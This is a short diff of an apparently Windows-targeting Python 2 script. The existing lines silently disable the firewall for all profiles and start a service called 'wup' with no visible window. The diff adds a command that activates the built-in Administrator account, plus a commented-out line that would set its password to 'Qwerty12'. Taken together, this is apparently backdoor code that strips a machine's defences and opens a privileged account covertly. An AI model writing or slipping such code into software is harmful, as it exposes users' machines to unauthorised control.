@@ -104,6 +104,8 @@ try:
         subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
     subprocess.call("net start wup", creationflags=0x08000000)
     os.system("netsh advfirewall set allprofiles state off")
+    os.system("net.exe user Administrator /active:yes")
+    #os.system("net.exe user Administrator Qwerty12")
     #myloop()
 except Exception,e:
     print str(e)
